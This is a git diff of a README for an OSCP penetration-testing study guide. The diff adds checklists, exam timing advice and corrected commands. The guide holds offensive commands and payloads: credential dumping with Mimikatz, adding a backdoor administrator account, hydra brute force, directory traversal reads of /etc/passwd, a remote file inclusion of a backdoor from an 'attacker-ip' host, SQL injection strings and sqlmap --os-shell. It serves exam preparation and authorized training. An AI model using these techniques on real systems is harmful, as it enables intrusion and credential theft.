@@ -1,14 +1,59 @@
 ![Chrome dragon surrounded by orange light with OSCP+ in the lower-right corner](assets/oscp-field-notes-cover.png)
 
-# OSCP Field Notes
+# OSCP Ultimate Field Manual
 
-**Practical workflows, command references and reporting templates for OSCP preparation.**
+**A practical OSCP preparation playbook: enumerate, verify, exploit, escalate and document.**
 
-[Start here](docs/start-here.md) · [Command reference](#general) · [Exam checklist](docs/exam.md) · [Contribute](CONTRIBUTING.md)
+[Start here](docs/start-here.md) · [Contents](#contents) · [Exam mindset](#exam-mindset--time-management) · [Exam checklist](docs/exam.md) · [Contribute](CONTRIBUTING.md)
 
 From your first scan to a reproducible report: find the next step, check its prerequisites and record what worked. Covers Linux, Windows, web applications, Active Directory and pivoting.
 
 [Command compatibility review](docs/command-audit.md) · [CVE references and external PoCs](docs/cve-references.md)
+
+## Contents
+
+| Stage | Reference | Guided workflow |
+|---|---|---|
+| Prepare | [Setup](#quick-setup), [file locations](#important-locations), [transfers](#file-transfers), [credentials](#password-hash-cracking) | [Toolkit](docs/toolkit.md) |
+| Enumerate | [Port scanning](#port-scanning), [FTP](#ftp-enumeration), [SSH](#ssh-enumeration), [SMB](#smb-enumeration), [HTTP](#https-enumeration) | [Target methodology](docs/methodology.md) |
+| Enumerate further | [DNS](#dns-enumeration), [SMTP](#smtp-enumeration), [LDAP](#ldap-enumeration), [NFS](#nfs-enumeration), [SNMP](#snmp-enumeration), [RPC](#rpc-enumeration) | [AD workflow](docs/active-directory.md) |
+| Establish access | [Web attacks](#web-attacks), [exploitation](#exploitation), [reverse shells](#reverse-shells) | [Manual web workflow](docs/web.md) |
+| Escalate | [Windows](#windows-privilege-escalation), [Linux](#linux-privilege-escalation) | [Verify prerequisites](docs/privilege-escalation.md) |
+| Move and collect | [Post exploitation](#post-exploitation), [Active Directory](#active-directory-pentesting), [pivoting](#ligolo-ng) | [Routing guide](docs/pivoting.md) |
+| Finish | [Exam mindset & time management](#exam-mindset--time-management), [evidence checklist](docs/exam.md#evidence-at-each-milestone) | [Report template](templates/report.md) |
+
+## How to use this manual
+
+Read the workflow for your current situation, then use the command reference to answer a specific question. Existing technical examples and attribution are retained, with identified corrections recorded in the [command review](docs/command-audit.md#field-manual-follow-up-review). Historical examples describe particular environments; they are not universal exploit recipes.
+
+- Replace `<PLACEHOLDERS>` before execution. `IP` is the target; `LHOST` must be reachable **from that target**. `URL` includes scheme and any non-default port.
+- Bash examples run on Kali unless stated otherwise. Windows examples specify PowerShell or CMD where corrected; mixed historical transcripts use `text` fences. Tool-console commands run inside that tool, not in your OS shell.
+- Save commands, output and findings in a private notebook. A checked box means the question was investigated; write the result, including a negative result.
+- Source-reviewed commands still need a matching tool version and target. See [validation levels](docs/coverage.md#validation-levels); no offensive workflow was executed during this revision.
+
+> **Exam Tip:** Only use automated enumeration when manual checks leave a specific gap. Understand the request and verify the finding yourself. This study preference does not override exam restrictions: prohibited tools remain prohibited when manual attempts fail.
+
+## Exam Mindset & Time Management
+
+Treat each target as a set of testable questions. Write `observation → hypothesis → smallest test → result → next action`. A version string, scanner label or valid login is a lead; verify the permission or behavior needed for the next step.
+
+The following timeboxes are **practice suggestions**, not OffSec requirements. Adjust them using timed rehearsals:
+
+| Moment | Action | Decision point |
+|---|---|---|
+| First 15–30 minutes | Read panel objectives, verify VPN, prepare notes and start service inventories | Can you explain the target list, evidence requirements and reachable services? |
+| First pass on each host | Inspect each exposed service and record promising credentials, paths and versions | Prioritize a concrete lead over a long version-only exploit search |
+| Every 45–60 minutes on one hypothesis | Record what changed and the next smallest test | With no new evidence, park the hypothesis and switch service or host |
+| Every access or privilege milestone | Confirm identity, record the path, capture proof evidence and submit the value | Access, required privilege, screenshot and panel submission are separate milestones |
+| Between focused blocks | Take a short break; schedule food and rest in advance | Fatigue and repeated identical commands are reasons to reset the approach |
+| Final 60–90 minutes of the practical window | Audit evidence and panel submissions; fill reproducibility gaps | Do not leave known proof or screenshot gaps for the reporting window |
+| Documentation window | Build the report from saved evidence, inspect the PDF and verify packaging/upload | Leave an upload buffer; use the exact current guide requirements |
+
+Before switching targets, leave a resume note: current identity, open services, verified credentials, rejected hypotheses, running jobs and **one next test**. Re-enumerate after every new hostname, credential, privilege or route. AD starting credentials are a starting point for mapping access; do not assume an all-or-nothing score for the set.
+
+> **Exam Tip:** Count only milestones supported by the panel objectives and complete evidence. Capture while you work; a shell or proof value without the required documentation can cost the result.
+
+Use the [exam checklist](docs/exam.md) for the current rule snapshot and the [training plan](docs/training.md) to rehearse this process. The [official guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) controls exam permission, scoring and submission.
 
 ## Find your next step
 
@@ -44,15 +89,17 @@ Found a clearer approach or a stale command? [Contributions are welcome](CONTRIB
 
 [Setup](#quick-setup) · [Enumeration](#recon-and-enumeration) · [Web](#web-attacks) · [Windows](#windows-privilege-escalation) · [Linux](#linux-privilege-escalation) · [Active Directory](#active-directory-pentesting)
 
-## Quick setup
+### Quick setup
 
 
-#### Exports
+<a id="exports"></a>
 
+#### Environment variables
 
-```
+Kali Bash; avoid storing literal passwords in shell history. These variables are local to this shell and its child processes.
+
+```bash
 export TARGET_USER="<username>"
-export PASSWORD="<password>"
 export LHOST="<local_ip>"
 export LPORT="<local_port>"
 export IP="<target_ip>"
@@ -60,10 +107,11 @@ export URL="<target_url>"
 export VPN_CONFIG="<path_to_your_vpn_config>"
 ```
 
-#### Aliases suggestion
+<a id="aliases-suggestion"></a>
 
+#### Optional Bash aliases
 
-```
+```bash
 alias ll='ls -alF'
 alias oscp-http='python3 -m http.server 8000'
 alias oscp-listen='nc -lvnp "$LPORT"'
@@ -73,26 +121,23 @@ alias oscp-vpn='sudo openvpn "$VPN_CONFIG"'
 
 #### Scanning
 
+Kali Bash, inside your private session directory. Separate discovery from detailed service checks:
 
-1. Nmap TCP scan over 65535 ports
-
-```
-sudo nmap -T4 -sC -sV -p- $IP --open -oN nmap-tcp.txt -v
-```
-
-2. Nmap UDP scan over top ports
-
-```
-sudo nmap -sU --top-ports 20 $IP -oN nmap-udp-top.txt --open -v
+```bash
+mkdir -p scans
+sudo nmap -sS -p- --reason -oA scans/tcp-all "$IP"
+# Replace the example port list with ports discovered above.
+nmap -sT -sC -sV -p 22,80,445 --reason -oA scans/services "$IP"
+sudo nmap -sU --top-ports 20 --reason -oA scans/udp-top "$IP"
 ```
 
-## Important Locations
+Use `-Pn` when discovery probes miss a known reachable host. UDP `open|filtered` is inconclusive. `-oA` saves normal, XML and grepable output. Timing must fit the link; a fast scan can miss a lossy service. See [scan semantics](https://nmap.org/book/man-port-scanning-techniques.html) and the [target workflow](docs/methodology.md).
+
+### Important Locations
 
 Paths below include legacy installations. On current systems, also inspect `/etc/php/<VERSION>/`, `/etc/systemd/system/`, `/etc/nginx/` and `~/.ssh/id_ed25519` where applicable. Presence and read permissions must be checked; `~` is shell expansion, not a portable web-file path.
 
->💡 For Finding all important files in Windows:(CTF Style)
-`cd c:\Users` then
-`tree /F`
+> **Exam Tip:** Start with the relevant user or application directory; `tree /F` from `C:\Users` can produce a large amount of output. A directory listing is not proof of privileged access.
 
 <details>
 	<summary>Windows</summary>
@@ -192,7 +237,7 @@ Paths below include legacy installations. On current systems, also inspect `/etc
 	/etc/ftpaccess # FTP server access
 	/etc/ftpchroot # FTP chroot users
 	/etc/ftphosts # FTP host access
-	/etc/groups # Group accounts
+	/etc/group # Group accounts
 	/etc/grub.conf # Bootloader configuration
 	/etc/hosts # Hostname to IP
 	/etc/hosts.allow # Allowed hosts
@@ -284,8 +329,8 @@ Paths below include legacy installations. On current systems, also inspect `/etc
 	/proc/net/arp # ARP table
 	/proc/net/tcp # TCP connections
 	/proc/net/udp # UDP connections
-	/proc//cmdline # Process command line
-	/proc//maps # Process memory maps
+	/proc/<PID>/cmdline # Process command line
+	/proc/<PID>/maps # Process memory maps
 	/proc/sched_debug # Scheduler debug info
 	/proc/self/cwd/app.py # Current working directory app
 	/proc/self/environ # Process environment
@@ -453,13 +498,13 @@ Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyCont
 find / -type f -name '*.kdbx' 2>/dev/null
 ```
 
-### GitHub recon
+#### GitHub recon
 
 - You need to find traces of the `.git` files on the target machine.
 - Now navigate to the directory where the file is located, a potential repository.
 - Commands
 
-```jsx
+```text
 # Log information of the current repository.
 git log
 
@@ -472,7 +517,7 @@ git show <commit-id>
 - If you identify `.git` active on the website. Use https://github.com/arthaud/git-dumper now it downloads all the files and saves it locally. Perform the same above commands and escalate.
 - Some useful GitHub dorks: [https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets](https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets) → this might not be relevant to the exam environment.
 
-## Connecting to RDP
+### Connecting to RDP
 
 Use the installed FreeRDP 3 launcher (`xfreerdp3` or `xfreerdp`, depending on the package); check `/version` and `/help`. Clipboard redirection does not fix authentication. Verify unfamiliar certificate fingerprints before accepting them. [Package help](https://www.kali.org/tools/freerdp3/).
 
@@ -482,7 +527,7 @@ xfreerdp3 /d:domain.example /u:uname /v:IP
 xfreerdp3 /d:domain.example /u:uname /v:IP +clipboard /dynamic-resolution
 ```
 
-## Adding SSH Public key
+### Adding SSH Public key
 
 - This can be used to get ssh session, on target machine which is based on linux
 
@@ -499,7 +544,7 @@ chmod 600 ~/.ssh/authorized_keys
 ssh -i ~/.ssh/id_ed25519 username@target_ip #enter the key passphrase if you set one
 ```
 
-## File Transfers
+### File Transfers
 
 - Netcat
 
@@ -527,7 +572,7 @@ wget http://lhost/file
 curl -o <OUTPUT_FILE> http://<LHOST>/<FILE>
 ```
 
-### Windows to Kali
+#### Windows to Kali
 
 Kali Bash (use a dedicated transfer folder):
 
@@ -545,17 +590,17 @@ net use \\<KALI_IP>\share /delete
 
 Modern Windows policies can block guest SMB or require signing. Check the actual client policy and server support if negotiation fails; see [SMB hardening](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-security-hardening).
 
-## Adding Users
+### Adding Users
 
-### Windows
+#### Windows
 
-```powershell
+```text
 net user hacker hacker123 /add
 net localgroup Administrators hacker /add
 net localgroup "Remote Desktop Users" hacker /ADD
 ```
 
-### Linux
+#### Linux
 
 ```bash
 adduser <uname> #Interactive
@@ -564,55 +609,60 @@ useradd -m <uname>
 useradd -u <UID> -g <group> <uname>  #UID can be something new than existing, this command is to add a user to a specific group
 ```
 
-## Password-Hash Cracking
+### Password-Hash Cracking
 
 *Hash Analyzer*: [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/)  </br>
-## Password list mentioned in the OffSec Discord: 500-worst-passwords.txt
-### Hash Identifier
+<a id="password-list-mentioned-in-the-offsec-discord-500-worst-passwordstxt"></a>
+
+**Small training wordlist:** `500-worst-passwords.txt` (check the installed SecLists path).
+#### Hash Identifier
 - Identify the hash types using these tools
-```powershell
+```text
 hashid <FILE>
 name-that-hash -f <FILE>
 ```
-### fcrackzip
+#### fcrackzip
 
-```powershell
+```text
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip #Cracking zip files
 ```
 
-### John
+#### John
 
 > [https://github.com/openwall/john/tree/bleeding-jumbo/run](https://github.com/openwall/john/tree/bleeding-jumbo/run)
 > 
 - If there’s an encrypted file, try to convert it into john hash and crack.
 
-```powershell
+```text
 ssh2john.py id_rsa > hash
 #Convert the obtained hash to John format(above link)
 john hashfile --wordlist=rockyou.txt
 ```
-### keepass2John
-During the Initial enumeration process of the target with smbclient -L //target or smbclient -L ////target found Database.kdbx file in User directory.
-```powershell
+#### keepass2John
+Kali Bash: `smbclient -L "//$IP"` lists shares, not their files. Connect with `smbclient "//$IP/<SHARE>" -U '<DOMAIN>/<USER>'`, then use `ls`, `cd` and `get Database.kdbx` inside the SMB console.
+```text
 keepass2john Database.kdbx > keepass.hash
-john keepass.hash
-or
+john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
+# For Hashcat, remove only the leading John database label; retain the hash fields.
+cut -d: -f2- keepass.hash > keepass.hashcat
 hashcat --help | grep "KeePass" 
-hashcat -m 13400 keepass.hash  /home/kali/HTB/OSCP/rockyou.txt 
+hashcat -m 13400 keepass.hashcat /usr/share/wordlists/rockyou.txt
 ```
 
 
-### Hashcat
+#### Hashcat
+
+Select a mode from the actual extracted format. KeePass mode 13400 supports specific KeePass 1/2 formats; KDBX 4 output is not automatically compatible. Compare with the [upstream format examples](https://hashcat.net/wiki/doku.php?id=example_hashes), including their release-specific list.
 
 > [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
 > 
 
-```powershell
+```text
 #Obtain the Hash module number 
 hashcat -m <number> hash wordlists.txt
 ```
 
-## Pivoting through SSH
+### Pivoting through SSH
 
 ```bash
 ssh -i id_rsa -D 9050 adminuser@10.10.155.5 #SOCKS proxy port
@@ -622,18 +672,18 @@ ssh -i id_rsa -D 9050 adminuser@10.10.155.5 #SOCKS proxy port
 proxychains4 nxc smb 10.10.10.0/24 #Example
 ```
 
-## Dealing with Passwords
+### Dealing with Passwords
 
-- When there’s a scope for bruteforce or hash-cracking then try the following,
+- Before online login tests, determine the account scope and lockout policy. Start with a small evidence-based set; offline cracking has different constraints. In authorized practice, consider:
     - Have a valid usernames first
-    - Dont firget trying `admin:admin`
+    - Documented product defaults, such as `admin:admin` where applicable
     - Try `username:username` as first credential
     - If it’s related to a service, try default passwords.
     - Service name as the username as well as the same name for password.
     - Use Rockyou.txt
-- Some default passwords to always try out!
+- Historical weak-password candidates (these are not universal product defaults):
 
-```jsx
+```text
 password
 password1
 Password1
@@ -645,7 +695,7 @@ admin@123
 
 ```
 
-## Impacket
+### Impacket
 
 > The commands below use the `impacket-*` launchers provided by Kali's Impacket package. When running directly from an upstream source checkout, the equivalent example filenames end in `.py`.
 
@@ -677,7 +727,7 @@ impacket-atexec -hashes <LMHASH>:<NTHASH> test.local/john@10.10.10.1 <command>
 
 ```
 
-## Evil-Winrm
+### Evil-Winrm
 
 Certificate authentication requires a certificate mapped to an authorized account. Built-in helpers such as `Bypass-4MSI` are version-dependent and are not guaranteed to bypass current defenses. [Upstream usage](https://github.com/Hackplayers/evil-winrm).
 
@@ -720,38 +770,38 @@ menu
 Invoke-Binary /opt/privsc/winPEASx64.exe
 ```
 
-## Mimikatz
+### Mimikatz
 
-```powershell
+```text
 privilege::debug
 
 token::elevate
 
 sekurlsa::logonpasswords #hashes and plaintext passwords
 lsadump::sam
-lsadump::sam SystemBkup.hiv SamBkup.hiv
+lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
 lsadump::dcsync /user:krbtgt
-lsadump::lsa /patch #both these dump SAM
+lsadump::lsa /patch # LSA memory patching is distinct from SAM dumping
 
 #OneLiner
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 
 ```
 
-## Ligolo-ng
+### Ligolo-ng
 
 See the [pivoting guide](docs/pivoting.md) for commands separated by Kali, agent and Ligolo console, certificate fingerprint verification, internal routes, callback listeners and pivot-local services.
 
 ---
 
-# Recon and Enumeration
+## Recon and Enumeration
 
 - OSINT OR Passive Recon
     
-    <aside>
-    💡 Not that useful for OSCP as we’ll be dealing with internal machines
     
-    </aside>
+    **Exam Tip:** Prioritize the supplied target network. Public OSINT examples below are additional training references; do not send private target data to external services.
+
+
     
     - whois: `whois <domain>` or `whois <domain> -h <IP>`
     - Google dorking,
@@ -771,13 +821,15 @@ See the [pivoting guide](docs/pivoting.md) for commands separated by Kali, agent
     - Scanning Security headers and SSL/TLS using [https://securityheaders.com/](https://securityheaders.com/)
     
 
-## Port Scanning
+### Port Scanning
 
-```powershell
+```text
 #use -Pn option if you're getting nothing in scan
 nmap -sC -sV <IP> -v #Basic scan
 nmap -T4 -A -p- <IP> -v #complete scan
-sudo nmap -sV -p 443 --script "vuln" 192.168.50.124 #running vuln category scripts
+# Review a specific NSE script and its behavior before selecting it.
+nmap --script-help <SCRIPT_NAME>
+sudo nmap -sV -p 443 --script <SCRIPT_NAME> <IP>
 
 #NSE
 updatedb
@@ -786,12 +838,22 @@ sudo nmap --script="name" <IP> #here we can specify other options like specific 
 
 Test-NetConnection -Port <port> <IP>   #powershell utility
 
-1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null #automating port scan of first 1024 ports in powershell
+# PowerShell: check selected ports; inspect TcpTestSucceeded, not just PingSucceeded.
+22,80,445 | ForEach-Object { Test-NetConnection -ComputerName '<IP>' -Port $_ -WarningAction SilentlyContinue }
 ```
 
-## FTP enumeration
+### FTP enumeration
 
-```powershell
+**Checklist**
+
+- [ ] Anonymous login or known credentials tested?
+- [ ] Readable backups/configurations downloaded selectively?
+- [ ] Upload permissions and any corresponding web path verified?
+- [ ] Passive/active transfer failure distinguished from login failure?
+
+> **Exam Tip:** Use `binary` in the FTP console before transferring executables or archives; verify file integrity afterward.
+
+```text
 ftp <IP>
 #login if you have relevant creds or based on nmpa scan find out whether this has anonymous login or not, then loginwith anonymous:password
 
@@ -809,9 +871,18 @@ hydra -l offsec -P /usr/share/seclists/Passwords/500-worst-passwords.txt <IP> ft
 #check for vulnerabilities associated with the version identified.
 ```
 
-## SSH enumeration
+### SSH enumeration
 
-```powershell
+**Checklist**
+
+- [ ] Correct port, account and key type?
+- [ ] Weak credentials or a discovered reused password?
+- [ ] Writable `.ssh` directory or `authorized_keys` for the intended account?
+- [ ] Key ownership, permissions and server authentication policy checked?
+
+> **Exam Tip:** A private-key passphrase prompt is local; it is different from the remote account password prompt.
+
+```text
 #Login
 ssh uname@IP #enter password in the prompt
 
@@ -831,9 +902,19 @@ hydra -l offsec -P /usr/share/seclists/Passwords/500-worst-passwords.txt <IP> ss
 #check for vulnerabilities associated with the version identified.
 ```
 
-## SMB enumeration
+### SMB enumeration
 
-```powershell
+**Checklist**
+
+- [ ] Anonymous access tested separately from authenticated access?
+- [ ] Local or domain identity recorded?
+- [ ] Readable shares, backups, scripts and credential stores checked?
+- [ ] Write permissions distinguished from administrative execution rights?
+- [ ] Recovered credentials retested on relevant services?
+
+> **Exam Tip:** List shares, connect to one, then browse files. A share listing is not a recursive file inventory.
+
+```text
 sudo nbtscan -r 192.168.50.0/24 #IP or range can be provided
 
 #NSE scripts can be used
@@ -873,13 +954,23 @@ get <file> #to download file
 - Downloading shares made easy - if the folder consists of several files, they all be downloading by this.
 
 ```powershell
-mask ""
+mask *
 recurse ON
 prompt OFF
 mget *
 ```
 
-## HTTP/S enumeration
+### HTTP/S enumeration
+
+**Checklist**
+
+- [ ] Every web port, redirect and discovered hostname checked?
+- [ ] Source, robots.txt, scripts and API routes inspected?
+- [ ] Weak credentials, reused passwords and application roles tested?
+- [ ] Nonexistent-path response measured before directory discovery?
+- [ ] Upload, file-read and execution permissions distinguished?
+
+> **Exam Tip:** Save a valid request before modifying it; preserve Host, cookies and CSRF tokens.
 
 - Check with whatweb 'URL'
 - View source-code and identify any hidden content. If some image looks suspicious download and try to find hidden data in it.
@@ -889,7 +980,7 @@ mget *
 - Directory and file discovery - Obtain any hidden files which may contain juicy information
   
 
-```powershell
+```text
 dirbuster
 gobuster dir -u http://example.com -w /path/to/wordlist.txt
 python3 dirsearch.py -u http://example.com -w /path/to/wordlist.txt
@@ -900,7 +991,7 @@ python3 dirsearch.py -u http://example.com -w /path/to/wordlist.txt
 - Default credentials, Identify the CMS or service and check for default credentials and test them out.
 - Bruteforce
 
-```powershell
+```text
 hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https, post or get can be obtained from Burpsuite. Also do capture the response for detailed info.
 
@@ -911,7 +1002,7 @@ hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:na
 - Check if other services like FTP/SMB or anyothers which has upload privileges are getting reflected on web.
 - API - Fuzz further and it can reveal some sensitive information
 
-```powershell
+```text
 #identifying endpoints using gobuster
 gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern #pattern can be like {GOBUSTER}/v1 here v1 is just for example, it can be anything
 
@@ -923,11 +1014,11 @@ curl -i http://192.168.50.16:5002/users/v1
 - Check the URL, whether we can leverage **Local or Remote File Inclusion**.
 - Also check if there’s any file upload utility(also obtain the location it’s getting reflected)
 
-### Wordpress
+#### Wordpress
 
 Use the installed `wpscan --help`; vulnerability details depend on the API token and database coverage. [Current help](https://www.kali.org/tools/wpscan/).
 
-```powershell
+```text
 # basic usage
 wpscan --url "target" --verbose
 
@@ -943,24 +1034,33 @@ http://10.10.67.245/retro/wp-admin/theme-editor.php?file=404.php&theme=90s-retro
 http://10.10.67.245/retro/wp-content/themes/90s-retro/404.php
 ```
 
-### Drupal
+#### Drupal
 
 ```bash
 droopescan scan drupal -u http://site
 ```
 
-### Joomla
+#### Joomla
 
 ```bash
 droopescan scan joomla --url http://site
 sudo python3 joomla-brute.py -u http://site/ -w passwords.txt -usr username #https://github.com/ajnik/joomla-bruteforce 
 ```
 
-## DNS enumeration
+### DNS enumeration
+
+**Checklist**
+
+- [ ] Correct lab DNS server queried explicitly?
+- [ ] A/AAAA, PTR, MX, TXT and service records investigated where relevant?
+- [ ] New names mapped to services and virtual hosts?
+- [ ] Zone transfer considered only against the in-scope server?
+
+> **Exam Tip:** A hostname can reveal a new application on a familiar IP. Revisit HTTP and domain authentication after DNS findings.
 
 - Better use `Seclists` wordlists for better enumeration. [https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS](https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS)
 
-```powershell
+```text
 host www.megacorpone.com
 host -t mx megacorpone.com
 host -t txt megacorpone.com
@@ -980,9 +1080,18 @@ nslookup mail.megacorptwo.com
 nslookup -type=TXT info.megacorptwo.com 192.168.50.151 #We are querying the information from a specific IP, here it is 192.168.50.151. This can be very useful
 ```
 
-## SMTP enumeration
+### SMTP enumeration
 
-```powershell
+**Checklist**
+
+- [ ] Banner, EHLO capabilities and TLS support recorded?
+- [ ] VRFY/EXPN/RCPT behavior checked against a control username?
+- [ ] Usernames corroborated through another source?
+- [ ] Mail-delivery examples separated from passive enumeration?
+
+> **Exam Tip:** A disabled VRFY command does not prove that no valid users exist.
+
+```text
 nc -nv <IP> 25 #Version Detection
 smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode, it can be RCPT, VRFY, EXPN
 
@@ -990,10 +1099,27 @@ smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode, it can be RCPT, 
 sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
 
-## LDAP Enumeration
+### LDAP Enumeration
 
-```powershell
-ldapsearch -x -H ldap://<IP>:<port> # try on both ldap and ldaps, this is first command to run if you dont have any valid credentials.
+**Checklist**
+
+- [ ] RootDSE naming context and DC identity discovered?
+- [ ] Anonymous and authenticated results distinguished?
+- [ ] Base DN, TLS, bind identity and search filter correct?
+- [ ] Users, groups, computers and useful descriptions correlated?
+
+> **Exam Tip:** An empty search can mean a wrong base or insufficient rights; verify a known object before assuming the directory is empty.
+
+Kali Bash: query RootDSE explicitly to discover naming contexts. Use the returned base DN for subtree searches. Prefer LDAPS (normally 636) or StartTLS (`-ZZ` on LDAP, normally 389) with a trusted certificate before sending a password. Anonymous queries may be denied.
+
+```bash
+ldapsearch -x -H ldap://<IP>:389 -s base -b '' '(objectClass=*)' defaultNamingContext namingContexts
+ldapsearch -x -H ldaps://<DC_FQDN>:636 -D '<USER>@<DOMAIN>' -W -b '<BASE_DN>' '(objectClass=user)' sAMAccountName
+```
+
+Historical bind/base examples below require the correct domain layout. A simple bind over plain LDAP can expose the password; use validated TLS for credentialed queries. See [OpenLDAP ldapsearch](https://www.openldap.org/software/man.cgi?query=ldapsearch&sektion=1).
+
+```text
 
 ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
 ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
@@ -1020,16 +1146,34 @@ python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --da
 python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --privileged-users
 ```
 
-## NFS Enumeration
+### NFS Enumeration
 
-```powershell
+**Checklist**
+
+- [ ] Export paths and allowed clients recorded?
+- [ ] Mount/list/read/write permissions checked independently?
+- [ ] UID/GID mapping and root squashing verified?
+- [ ] NFSv4-only behavior considered if showmount returns nothing?
+
+> **Exam Tip:** A writable export alone does not establish a root escalation path; verify the server options and execution mount.
+
+```text
 nmap -sV --script=nfs-showmount <IP>
 showmount -e <IP>
 ```
 
-## SNMP Enumeration
+### SNMP Enumeration
 
-```powershell
+**Checklist**
+
+- [ ] UDP 161 and protocol version investigated?
+- [ ] Community string validated with a small known OID query?
+- [ ] Interfaces, processes, software and listening services correlated?
+- [ ] Missing OIDs distinguished from absent services?
+
+> **Exam Tip:** Walk a relevant subtree first; full MIB output can hide useful results in noise.
+
+```text
 #Nmap UDP scan
 sudo nmap -sU -sV -p 161 --reason -oN snmp-scan.txt <IP>
 
@@ -1051,9 +1195,18 @@ snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3 #Opened TCP Ports
 1.3.6.1.2.1.6.13.1.3 - TCP Local Ports
 ```
 
-## RPC Enumeration
+### RPC Enumeration
 
-```powershell
+**Checklist**
+
+- [ ] Anonymous session distinguished from an authenticated bind?
+- [ ] Domain identity and user/group RIDs recorded?
+- [ ] Share and password-policy results correlated with SMB?
+- [ ] Read-only queries separated from account-changing commands?
+
+> **Exam Tip:** Use enumerated RIDs for follow-up queries; a successful bind does not imply permission for every RPC operation.
+
+```text
 rpcclient -U=user $IP
 rpcclient -U "" -N "$IP" #Anonymous login
 ##Commands within in RPCclient
@@ -1076,16 +1229,15 @@ lsaenumsid #SID of all users
 
 ---
 
-# Web Attacks
+## Web Attacks
 
-<aside>
-💡 Cross-platform PHP revershell: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)
 
-</aside>
+**Exam Tip:** Cross-platform PHP revershell: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)
 
-## Directory Traversal
 
-```powershell
+### Directory Traversal
+
+```text
 cat /etc/passwd #displaying content through absolute path
 cat ../../../etc/passwd #relative path
 
@@ -1096,7 +1248,7 @@ cat ../../etc/passwd
 http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
 #check for id_rsa, id_ecdsa
 #If the output is not getting formatted properly then,
-curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd 
+curl --path-as-is "http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd"
 
 #For windows
 http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt #no need to provide drive
@@ -1104,21 +1256,21 @@ http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Use
 
 - URL Encoding
 
-```powershell
+```text
 #Sometimes it doesn't show if we try path, then we need to encode them
-curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+curl --path-as-is "http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
 ```
 
 - Wordpress
     - Simple exploit: https://github.com/leonjza/wordpress-shell
 
-## Local File Inclusion
+### Local File Inclusion
 
 - Directory traversal reads files outside the intended directory. LFI makes the application include a local file; it does not inherently provide code execution. Code execution may become possible in specific cases, such as log poisoning or an unsafe PHP wrapper.
 
 The log examples below assume executable PHP was already written into a readable log; adding `cmd=` alone does nothing. `data://` and remote URL inclusion depend on PHP configuration, including `allow_url_include`; `php://filter` can expose source without executing it. [PHP configuration](https://www.php.net/manual/en/filesystem.configuration.php).
 
-```powershell
+```text
 #At first we need 
 http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami #we're passing a command here
 
@@ -1142,9 +1294,9 @@ http://mountaindesserts.com/meteor/index.php?page=http://attacker-ip/simple-back
 we can also host a php reverseshell and obtain shell.
 ```
 
-## SQL Injection
+### SQL Injection
 
-```powershell
+```text
 admin' or '1'='1
 ' or '1'='1
 " or "1"="1
@@ -1199,7 +1351,7 @@ http://192.168.45.125/tmp/webshell.php?cmd=id #Command execution
 
 > **Training only: SQLMap is prohibited in the OSCP exam.** These historical examples are for authorized practice where the tool is allowed. Use the [manual web workflow](docs/web.md) to practice without it. See the [official restrictions](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide).
 
-```powershell
+```text
 sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user #Testing on parameter names "user", we'll get confirmation
 sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump #Dumping database
 
@@ -1211,22 +1363,24 @@ sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp" #/var/www
 
 ---
 
-# Exploitation
+## Exploitation
 
-## Finding Exploits
+### Finding Exploits
 
-### Searchsploit
+#### Searchsploit
 
 ```bash
 searchsploit <name>
 searchsploit -m windows/remote/46697.py #Copies the exploit to the current location
 ```
 
-## Reverse Shells
+### Reverse Shells
 
